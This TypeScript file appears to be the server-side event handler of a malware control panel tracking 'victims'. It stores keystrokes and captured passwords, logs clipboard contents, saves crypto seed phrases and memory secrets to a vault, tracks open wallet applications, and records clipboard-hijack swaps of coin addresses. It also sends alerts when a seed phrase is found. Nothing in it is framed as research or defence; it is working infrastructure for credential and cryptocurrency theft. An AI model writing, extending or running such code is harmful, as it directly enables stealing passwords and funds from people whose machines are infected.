import { createHash } from 'node:crypto';
import { prisma } from './db';
import { publish } from './bus';
import { notify } from '../services/notify';
import { upsertSecrets } from '../services/vault';
import { recordEntry } from './timeline';
import { closed as walletClosed, detected as walletDetected } from './wallet-detection';

export type EventInput = { kind: string; data: Record<string, unknown>; legacy: string };

function text(value: unknown, max: number): string {
  return typeof value === 'string' ? value.slice(0, max) : '';
}

/** One password row per process+title inside five minutes, with a counter. */
async function recordPassword(victimId: string, process: string, title: string, body: string): Promise<void> {
  const since = new Date(Date.now() - 5 * 60_000);
  const existing = await prisma.keylog.findFirst({
    where: { victimId, process, title, password: true, updatedAt: { gte: since } },
    orderBy: { updatedAt: 'desc' }
  }).catch(() => null);
  if (existing) {
    await prisma.keylog.update({
      where: { id: existing.id },
      data: { text: body, ts: new Date(), updatedAt: new Date(), count: { increment: 1 } }
    }).catch(() => undefined);
    return;
  }
  await prisma.keylog.create({ data: { victimId, process, title, text: body, password: true } });
}

/** Clipboard floods collapse onto one row per kind+content inside a minute. */
async function recordClipboard(victimId: string, kind: string, content: string, replaced: string | null, process = '', title = ''): Promise<void> {
  const since = new Date(Date.now() - 60_000);
  const existing = content
    ? await prisma.clipboardEntry.findFirst({
      where: { victimId, kind, content, updatedAt: { gte: since } },
      orderBy: { updatedAt: 'desc' }
    }).catch(() => null)
    : null;
  if (existing) {
    await prisma.clipboardEntry.update({
      where: { id: existing.id },
      data: { replaced, ts: new Date(), updatedAt: new Date(), count: { increment: 1 } }
    }).catch(() => undefined);
    return;
  }
  await prisma.clipboardEntry.create({ data: { victimId, ts: new Date(), process, window: title, content, kind, replaced } });
}

/** Persist a structured event and mirror it onto the typed tables. */
export async function applyEvent(victimId: string, event: EventInput): Promise<void> {
  const { kind, data } = event;
  const value = text(data.value, 8192);
  const hash = value ? createHash('sha256').update(value).digest('hex') : '';
  // The full value lives in the vault; events only keep a hash and a preview.
  const safeData: Record<string, unknown> = { ...data };
  if (hash) {
    delete safeData.value;
    safeData.preview = previewValue(kind, value);
  }
  // Seed and memory-secret echoes collapse onto one row per value per day.
  if (hash && (kind === 'secret_found' || kind === 'seed_found')) {
    const since = new Date(Date.now() - 24 * 3600_000);
    const existing = await prisma.event.findFirst({
      where: { victimId, kind, createdAt: { gte: since }, data: { path: ['hash'], equals: hash } },
      orderBy: { createdAt: 'desc' }
    }).catch(() => null);
    if (existing) {
      const previous = existing.data as Record<string, unknown>;
      const count = Number(previous.count ?? 1) + 1;
      await prisma.event.update({
        where: { id: existing.id },
        data: { data: { ...previous, ...safeData, hash, count, lastSeenAt: new Date().toISOString() } as never }
      });
      await storeSecret(victimId, kind, data, value);
      void publish({ type: 'event.new', victimId, at: Date.now(), data: { ...safeData, kind, hash, count, legacy: event.legacy } });
      return;
    }
    const created = await prisma.event.create({
      data: { victimId, kind, data: { ...safeData, hash, count: 1 } as never, legacy: event.legacy }
    });
    await storeSecret(victimId, kind, data, value);
    void publish({ type: 'event.new', victimId, at: Date.now(), data: { ...safeData, kind, hash, count: 1, id: created.id, legacy: event.legacy } });
  } else {
    await prisma.event.create({ data: { victimId, kind, data: data as never, legacy: event.legacy } });
    // `kind` goes last: a clipboard subtype in data must not overwrite the event kind.
    void publish({ type: 'event.new', victimId, at: Date.now(), data: { ...data, kind, legacy: event.legacy } });
  }

  if (kind === 'keystroke' || kind === 'clipboard') {
    await recordEntry(victimId, kind, data, event.legacy);
    if (kind === 'clipboard') {
      await recordClipboard(victimId, text(data.kind, 32) || 'text', value || text(data.content, 200_000), null, text(data.process, 260), text(data.title, 512));
    }
  }
  if (kind === 'wallet_detected') {
    await walletDetected(victimId, { name: String(data.name ?? data.text ?? ''), pid: Number(data.pid) || null, title: typeof data.title === 'string' ? data.title : null, text: typeof data.text === 'string' ? data.text : null });
  } else if (kind === 'wallet_closed') {
    await walletClosed(victimId, { pid: Number(data.pid) || null, title: typeof data.title === 'string' ? data.title : null });
  }
  if (kind === 'password') {
    await recordEntry(victimId, 'keystroke', { text: data.text, process: data.process, title: data.title }, event.legacy);
    await recordPassword(victimId, text(data.process, 260), text(data.title, 512), text(data.text, 4096) || event.legacy);
  } else if (kind === 'clipboard_secret') {
    await recordEntry(victimId, 'clipboard', { content: value, kind: data.kind, process: data.process, title: data.title }, event.legacy);
    if (value && String(data.kind ?? '').startsWith('seed')) {
      await storeSecret(victimId, 'seed_found', data, value);
      await seedFound(victimId, value);
    }
  } else if (kind === 'clipboard_replace') {
    const original = text(data.original, 256);
    if (original) {
      await recordEntry(victimId, 'clipboard', { content: original, kind: text(data.coin, 16) || 'replace', process: 'clipboard', title: text(data.replacement, 256) }, event.legacy);
      await recordClipboard(victimId, text(data.coin, 16) || 'replace', original, text(data.replacement, 256) || null);
    }
  }
}

function previewValue(kind: string, value: string): string {
  if (kind === 'seed_found') return `${value.trim().split(/\s+/).slice(0, 2).join(' ')} … ${value.trim().split(/\s+/).at(-1) ?? ''}`;
  return value.length > 18 ? `${value.slice(0, 8)}…${value.slice(-6)}` : value;
}

async function storeSecret(victimId: string, kind: string, data: Record<string, unknown>, value: string): Promise<void> {
  if (!value || (kind !== 'secret_found' && kind !== 'seed_found')) return;
  await upsertSecrets(victimId, [{
    kind: kind === 'seed_found' ? 'seed' : String(data.secret_kind ?? 'other'),
    value,
    words: kind === 'seed_found' ? Number(data.words) || null : null,
    confidence: data.confident === false ? 0.5 : null,
    path: typeof data.path === 'string' ? data.path : null,
    source: 'agent_event'
  }]).catch(() => undefined);
}

async function seedFound(victimId: string, value: string): Promise<void> {
  if (!value) return;
  await notify({
    kind: 'seed',
    victimId,
    title: 'Semilla encontrada',
    body: value.slice(0, 160),
    link: `/victims/${victimId}`,
    dedupeKey: `seed:${victimId}:${createHash('sha256').update(value).digest('hex')}`
  }).catch(() => undefined);
}

const FAILURE_WINDOW = 10 * 60_000;

/** Deduplicated failure telemetry. Returns true when a new row was written. */
export async function recordFailure(
  victimId: string,
  kind: 'task_failed' | 'module_degraded' | 'outbox_dropped',
  key: string,
  detail: string
): Promise<boolean> {
  const since = new Date(Date.now() - FAILURE_WINDOW);
  const existing = await prisma.event.findFirst({
    where: { victimId, kind, createdAt: { gte: since }, data: { path: ['key'], equals: key } },
    select: { id: true }
  }).catch(() => null);
  if (existing) return false;
  await prisma.event.create({
    data: { victimId, kind, data: { key, detail: detail.slice(0, 2000) } as never }
  });
  void publish({ type: 'event.new', victimId, at: Date.now(), data: { kind, key, detail: detail.slice(0, 2000) } });
  if (kind !== 'task_failed') {
    const count = await prisma.event.count({
      where: { victimId, kind, createdAt: { gte: since }, data: { path: ['key'], equals: key } }
    }).catch(() => 0);
    if (count === 5) {
      await notify({
        kind, victimId, title: kind === 'module_degraded' ? 'Module degraded' : 'Outbox dropping results',
        body: detail.slice(0, 300), link: `/victims/${victimId}`,
        dedupeKey: `${kind}:${victimId}:${key}`, dedupeMs: 30 * 60_000
      }).catch(() => undefined);
    }
  }
  return true;
}
